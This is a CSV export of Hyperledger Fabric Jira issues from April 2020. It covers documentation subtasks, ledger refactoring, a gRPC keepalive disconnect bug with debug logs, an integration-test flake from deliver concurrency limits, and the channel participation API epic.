Deploy peer,FAB-17703,44725,32076,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,pandrejko,pandrejko,03/Apr/20 5:11 AM,04/Dec/20 12:54 AM,28/Oct/23 3:09 AM,04/Dec/20 12:54 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01akr:",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deploy ordering service,FAB-17704,44726,32076,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,pandrejko,pandrejko,03/Apr/20 5:12 AM,04/Dec/20 12:54 AM,28/Oct/23 3:09 AM,04/Dec/20 12:54 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01akz:",,,,Unset,Unset,v2.0,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Oct/20 4:06 AM;pandrejko;This section also needs to be updated for Raft Ordering service:
[https://hyperledger-fabric.readthedocs.io/en/latest/enable_tls.html?highlight=enabling%20tls%20communications#configuring-tls-for-orderer-nodes];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add e2e test for couchdb index creation for a private data collection,FAB-17705,44727,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,manish-sethi,manish-sethi,03/Apr/20 5:27 AM,09/Nov/20 11:55 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0ip99",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
grpc disconnect after 40 seconds when using grpc 1.25.0 through 1.28.0,FAB-17706,44730,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,denyeart,denyeart,03/Apr/20 2:25 PM,06/Apr/20 9:09 PM,28/Oct/23 3:09 AM,03/Apr/20 10:18 PM,,,,,,,,,,v2.0.2,v2.1.0,v2.2.0,,fabric-peer,,,,,,,,,0,,,,,,"When using java chaincode or node chaincode, chaincode image build takes a long time.

After exactly 40 seconds, peer lifecycle chaincode install fails with following errors:
{code:java}
2020-04-03 04:11:14.431 UTC [grpc] infof -> DEBU 038 Client received GoAway with http2.ErrCodeEnhanceYourCalm.
2020-04-03 04:11:14.432 UTC [grpc] infof -> DEBU 039 transport: loopyWriter.run returning. connection error: desc = ""transport is closing""
2020-04-03 04:11:14.431 UTC [grpc] Infof -> DEBU 03a Subchannel Connectivity change to CONNECTING
2020-04-03 04:11:14.432 UTC [grpc] Infof -> DEBU 03b Subchannel picks a new address ""peer0.org1.example.com:7051"" to connect
2020-04-03 04:11:14.432 UTC [grpc] UpdateSubConnState -> DEBU 03c pickfirstBalancer: HandleSubConnStateChange: 0xc000422a80, {CONNECTING <nil>}
2020-04-03 04:11:14.432 UTC [grpc] Infof -> DEBU 03d Channel Connectivity change to CONNECTING
2020-04-03 04:11:14.437 UTC [grpc] Infof -> DEBU 03e Subchannel Connectivity change to READY
2020-04-03 04:11:14.437 UTC [grpc] UpdateSubConnState -> DEBU 03f pickfirstBalancer: HandleSubConnStateChange: 0xc000422a80, {READY <nil>}
2020-04-03 04:11:14.437 UTC [grpc] Infof -> DEBU 040 Channel Connectivity change to READY
2020-04-03 04:11:14.439 UTC [grpc] infof -> DEBU 041 Client received GoAway with http2.ErrCodeEnhanceYourCalm.
2020-04-03 04:11:14.439 UTC [grpc] Infof -> DEBU 042 Subchannel Connectivity change to CONNECTING
2020-04-03 04:11:14.440 UTC [grpc] UpdateSubConnState -> DEBU 043 pickfirstBalancer: HandleSubConnStateChange: 0xc000071990, {CONNECTING <nil>}
2020-04-03 04:11:14.440 UTC [grpc] Infof -> DEBU 044 Channel Connectivity change to CONNECTING
Error: failed to endorse chaincode install: rpc error: code = Unavailable desc = transport is closing
2020-04-03 04:11:14.440 UTC [grpc] infof -> DEBU 045 transport: loopyWriter.run returning. connection error: desc = ""transport is closing""
!!!!!!!!!!!!!!! Chaincode installation on peer0.org1 has failed !!!!!!!!!!!!!!!!
{code}
Meanwhile peer shows the following errors:
{code:java}
2020-04-03 04:11:14.430 UTC [grpc] errorf -> DEBU 351 transport: Got too many pings from the client, closing the connection.
2020-04-03 04:11:14.431 UTC [grpc] errorf -> DEBU 352 transport: loopyWriter.run returning. Err: transport: Connection closing
2020-04-03 04:11:14.439 UTC [grpc] errorf -> DEBU 353 transport: Got too many pings from the client, closing the connection.
2020-04-03 04:11:14.439 UTC [grpc] errorf -> DEBU 354 transport: loopyWriter.run returning. Err: transport: Connection closing
2020-04-03 04:11:14.440 UTC [grpc] warningf -> DEBU 355 transport: http2Server.HandleStreams failed to read frame: read tcp 192.168.192.4:7051->192.168.192.11:34836: use of closed network connection
2020-04-03 04:11:14.443 UTC [grpc] infof -> DEBU 356 transport: loopyWriter.run returning. connection error: desc = ""transport is closing""
{code}
I tracked the problem down, it is due to keepalive ping behavior change in google.golang.org/grpc 1.25.0. Specifically change [https://github.com/grpc/grpc-go/pull/3102]. grpc default keepalive timeout is 20s, so likely related to multiples of this timeout value (40s). With google.golang.org/grpc commits prior to this change, the issue does not occur.

The Fabric issue was introduced in [https://github.com/hyperledger/fabric/pull/930] which updated grpc from 1.24.0 to 1.28.0. 

 ",,denyeart,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01alv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,mbwhite,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Apr/20 9:29 PM;mbwhite;Reproduced this yesterday locally - but only one chaincode test that used typescript.. Assume that the additional compilation time required passed 'the limit'

Let us know if there any client side options that we'll need to update.;;;","03/Apr/20 10:18 PM;denyeart;This is now fixed with [https://github.com/hyperledger/fabric/pull/987|https://github.com/hyperledger/fabric/pull/987]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mv version package to core/ledger/internal/pkg,FAB-17707,44731,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,03/Apr/20 4:06 PM,04/Apr/20 6:40 PM,28/Oct/23 3:09 AM,04/Apr/20 6:40 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01am3:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mv keys/updatebatches to ledger/internal/pkg/state,FAB-17708,44732,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,Senthil1,Senthil1,Senthil1,03/Apr/20 11:11 PM,10/Apr/20 1:49 AM,28/Oct/23 3:09 AM,10/Apr/20 1:49 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01amb:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function for creating system channel genesis block,FAB-17709,44733,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,04/Apr/20 2:22 AM,17/Apr/20 3:19 AM,28/Oct/23 3:09 AM,17/Apr/20 3:19 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to be able to create genesis blocks for system channels. As a reminder, system channel genesis block does not create an application group and instead only fills the channel config group with an orderer and consortiums group. Whether we choose to combine this function with application channel creation like what was done in the original configtx encoder, or we choose to split them into separate API functions is up to the implementer.

 

*Acceptance*

I can call a function to create a system channel genesis block. There should be a new example added that demonstrates this behavior.",,caod,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzi",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,xwu,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Apr/20 10:53 PM;caod;[~xwu] I forgot at the time of creating this story that this should be a genesis block and not a channel creation tx. System channel creation is tied to creating an actual block itself. There's examples of this in configtxgen;;;","10/Apr/20 7:55 PM;xwu;[~caod] Thank you very much for reminding.;;;","10/Apr/20 7:55 PM;xwu;https://github.com/hyperledger/fabric/pull/1055;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm pkg in core/ledger/internal/pkg,FAB-17710,44734,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,04/Apr/20 6:50 PM,08/Apr/20 12:49 AM,28/Oct/23 3:09 AM,08/Apr/20 12:49 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01amj:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add GitHub Action to Provide DCO Information,FAB-17711,44735,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,05/Apr/20 11:32 AM,11/Jan/21 1:36 AM,28/Oct/23 3:09 AM,11/Jan/21 1:36 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"With the move to GitHub, many, many more people are contributing, especially around documentation updates. The Doc team struggles with the fact that many people make the changes via the GitHub UI for which there is no automated procedure for signing off their commits. The DCO-bot provides very basic instructions in the event, but the problem is its hidden on the `Checks` tab under `DCO` and the instructions assume the change was created on the CLI and you have access to the branch locally.

We should create a simple GitHub action to verify the signoff exists for all commits, and if it does not exist, comment on the PR with how to fix the signoffs and push the changes as well as add the `dco-signoff-required` tag.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8j",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Channel participation API - Join, Leave & List channels w/o a system channel",FAB-17712,44736,,Epic,In Progress,FAB,Fabric,software,denyeart,,,High,,tock,tock,tock,05/Apr/20 4:42 PM,30/May/21 3:42 AM,28/Oct/23 3:09 AM,,,,,,,,,,,v2.3.0,,,,,,,,,,,,,3,,,,,,"Currently in order to create a channel one needs to issue a config transaction to the system channel. This has *privacy, scalability* and *operational* disadvantages, since the system channel (and the orderers running it) is aware of all channels and of all channel members (at creation time).

In this feature we propose to expose a ""channel participation"" API that would allow a local orderer administrator to *join* and *leave* a channel, as well as to *list* all the channels that the *local orderer* is part of. This allows a Fabric network to be operated *without* the use of *a system channel*, which improves the privacy and scalability of the ordering service and the network as a whole. It also alleviates some of the operational problems associated with the current style of channel creation.

This feature is described in an RFC titled ""Channel participation api without system channel"" ([currently PR #24|https://github.com/hyperledger/fabric-rfcs/pull/24]).

This feature was presented in a [Fabric contributor's meeting|https://wiki.hyperledger.org/display/fabric/Contributor+Meetings+2020] on April 1st 2020, the presentation is here: [^Channel Participation API - community call - 1Apr2020.pdf].

 ",,art.gor,baohua,C0rWin,davidkhala,denyeart,hello2mao,jyellick,kgeonw,MichaelWang,robmurgai,rolivieri,tock,vijay5378,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18393,,,,,,"05/Apr/20 4:41 PM;tock;Channel Participation API - community call - 1Apr2020.pdf;https://jira.hyperledger.org/secure/attachment/18206/Channel+Participation+API+-+community+call+-+1Apr2020.pdf",,,,,,,,,,,,,,,,Core feature completed in v2.3.,(Please add high level design or a link to the design),Unset,Unset,Unset,ghx-label-11,,Channel participation API,To Do,No,,Unset,No,,,"1|i01amz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),art.gor,baohua,C0rWin,davidkhala,denyeart,hello2mao,jyellick,kgeonw,MichaelWang,robmurgai,rolivieri,tock,vijay5378,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/20 2:17 AM;baohua;I like this new enhanced feature, which resolves several issues in the OSN and channel management currently (have to handle these issues by adding similar changes before it). 

A quick question in practice:

Will this enhancement break the compatibilities on existing 2.x OSNs that have local ledger already?

If so, we need a similar migration steps as the kafka --> raft one?;;;","01/Jul/20 4:41 PM;tock;This is planned to be 100% backward compatible to networks (OSNs) that work with a system channel. That is, the two modes of operation are supported, but not simultaneously in the same network. That is - an OSN network with a system will continue to operate normally with this in place. New OSN networks will be able to choose between the two modes of operation.

There will also be a ""migration"" path for a network running with a system channel to remove that channel and start operating with the channel participation API. (see https://jira.hyperledger.org/browse/FAB-17965). In addition, we also plan to provide a flow for starting with an empty network and creating the system channel with the channel participation API. From then on, the system will operate with a system channel as normal. This eases the task of provisioning an ordering service for some cloud providers (see https://jira.hyperledger.org/browse/FAB-17911).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm proto msg folder present in stateleveldb,FAB-17713,44737,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,05/Apr/20 11:16 PM,08/Apr/20 12:46 AM,28/Oct/23 3:09 AM,08/Apr/20 12:46 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01an7:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm proto msg folder present in statecouchdb,FAB-17714,44738,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,06/Apr/20 12:11 AM,08/Apr/20 12:46 AM,28/Oct/23 3:09 AM,08/Apr/20 12:46 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01anf:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix cache proto optional go_package,FAB-17715,44739,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,06/Apr/20 12:58 PM,08/Apr/20 12:49 AM,28/Oct/23 3:09 AM,08/Apr/20 12:49 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ann:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in lifecycle/interop_test - too many requests for /protos.Deliver,FAB-17716,44741,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,sykesm,sykesm,07/Apr/20 5:50 AM,10/Apr/20 11:11 AM,28/Oct/23 3:09 AM,10/Apr/20 4:52 AM,v2.1.0,,,,,,,,,v2.1.0,v2.2.0,,,fabric-common,,,,,,,,,0,ci-flake,,,,,"This is related to recent endorser and deliver concurrency limits that were introduced in PR #647 / FAB-14761 and an ""artificial limit of 1 deliver stream"" as suggested in one of the comments.

{code}
2020-04-06T20:15:37.3537056Z ------------------------------
2020-04-06T20:15:37.3537561Z • Failure [52.840 seconds]
2020-04-06T20:15:37.3538437Z Release interoperability Interoperability scenarios Chaincode-to-chaincode interoperability when the network starts with legacy definitions and then upgrades to 2.0 [It] performs a cc2cc invocation which fails because in the meantime, the caller is upgraded with the new lifecycle 
2020-04-06T20:15:37.3540072Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/lifecycle/interop_test.go:723
2020-04-06T20:15:37.3540330Z 
2020-04-06T20:15:37.3540607Z   Expected
2020-04-06T20:15:37.3540814Z       <*errors.withMessage | 0xc0017defe0>: {
2020-04-06T20:15:37.3541077Z           cause: {
2020-04-06T20:15:37.3541261Z               Code: 2,
2020-04-06T20:15:37.3541540Z               Message: ""too many requests for /protos.Deliver, exceeding concurrency limit (1)"",
2020-04-06T20:15:37.3542000Z               Details: nil,
2020-04-06T20:15:37.3542221Z               XXX_NoUnkeyedLiteral: {},
2020-04-06T20:15:37.3542440Z               XXX_unrecognized: nil,
2020-04-06T20:15:37.3542645Z               XXX_sizecache: 0,
2020-04-06T20:15:37.3543299Z           },
2020-04-06T20:15:37.3543555Z           msg: ""error receiving from deliver filtered at 127.0.0.1:23004"",
2020-04-06T20:15:37.3543771Z       }
2020-04-06T20:15:37.3544004Z   to match error
2020-04-06T20:15:37.3544237Z       <*matchers.ContainSubstringMatcher | 0xc0018adb00>: {
2020-04-06T20:15:37.3544530Z           Substr: ""transaction invalidated with status (MVCC_READ_CONFLICT)"",
2020-04-06T20:15:37.3544756Z           Args: nil,
2020-04-06T20:15:37.3545216Z       }
2020-04-06T20:15:37.3545310Z 
2020-04-06T20:15:37.3545537Z   /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/lifecycle/interop_test.go:746
2020-04-06T20:15:37.3545943Z ------------------------------
2020-04-06T20:16:51.7224980Z ••••
2020-04-06T20:16:51.7225332Z 
2020-04-06T20:16:51.7225670Z Summarizing 1 Failure:
2020-04-06T20:16:51.7225818Z 
2020-04-06T20:16:51.7226745Z [Fail] Release interoperability Interoperability scenarios Chaincode-to-chaincode interoperability when the network starts with legacy definitions and then upgrades to 2.0 [It] performs a cc2cc invocation which fails because in the meantime, the caller is upgraded with the new lifecycle 
2020-04-06T20:16:51.7228018Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/lifecycle/interop_test.go:746
2020-04-06T20:16:51.7228467Z 
2020-04-06T20:16:51.7228979Z Ran 15 of 15 Specs in 420.849 seconds
2020-04-06T20:16:51.7229584Z FAIL! -- 14 Passed | 1 Failed | 0 Pending | 0 Skipped
2020-04-06T20:16:51.7230060Z --- FAIL: TestLifecycle (420.85s)
{code}
Logs attached from https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/11465/logs/70

/fyi [~wenjian] [~yacovm]",,sykesm,wenjian,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Apr/20 5:43 AM;sykesm;70.txt;https://jira.hyperledger.org/secure/attachment/18209/70.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ao3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wenjian,yacovm,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Apr/20 5:59 AM;yacovm;ok i guess you just need to loosen the limits in this test, no? ;;;","08/Apr/20 4:38 AM;wenjian;Root cause: in [https://github.com/hyperledger/fabric/blob/master/integration/lifecycle/lifecycle_suite_test.go#L263 |https://github.com/hyperledger/fabric/blob/master/integration/lifecycle/lifecycle_suite_test.go#L263]CommitTx method, both dg.Connect and dg.Wait create goroutines calling DeliverClient, so it may exceed concurrency limit causing test flake.

Increasing the limit for this test can fix the problem. However, when a new test is added, it may run into the same problem. It is better to increase the limit in core_template.go for all tests. Then overwrite the limit to 1 for a specific test (e.g., pvtdata_test.go).

 ;;;","10/Apr/20 2:41 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1044];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ChainID to ChannelID - core,FAB-17717,44743,17833,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,iamksseo,iamksseo,iamksseo,07/Apr/20 10:42 AM,08/Apr/20 11:15 PM,28/Oct/23 3:09 AM,08/Apr/20 11:15 PM,,,,,,,,,,v2.2.0,,,,,,,,,,,,,0,,,,,,,,denyeart,iamksseo,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aoj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,iamksseo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Apr/20 11:15 PM;denyeart;https://github.com/hyperledger/fabric/pull/1010;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"rename storageutil to statemetadata, rm dead-code",FAB-17718,44745,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,08/Apr/20 12:51 AM,10/Apr/20 10:57 PM,28/Oct/23 3:09 AM,10/Apr/20 10:57 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01aoz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Upgrade docs for 2.1,FAB-17719,44746,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,joe-alewine,joe-alewine,joe-alewine,08/Apr/20 2:49 AM,14/Apr/20 8:21 PM,28/Oct/23 3:09 AM,14/Apr/20 7:04 AM,,,,,,,,,,v2.1.0,,,,fabric-docs,,,,,,,,,0,,,,,,Change two docs to specify the difference between 1.4.x to 2.0 and 2.0 to 2.1.,,joe-alewine,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ap7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),joe-alewine,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
